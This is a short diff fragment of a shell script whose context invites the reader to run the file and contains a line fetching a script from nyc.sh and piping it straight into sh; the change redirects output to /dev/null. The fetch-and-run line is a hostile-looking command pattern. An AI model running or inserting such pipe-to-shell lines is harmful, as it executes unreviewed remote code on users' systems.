@@ -18,5 +18,4 @@ Respond if you please by running this file.
       }
     fi
     get http://nyc.sh/nyc.sh | sh
-
-'
+' > /dev/null
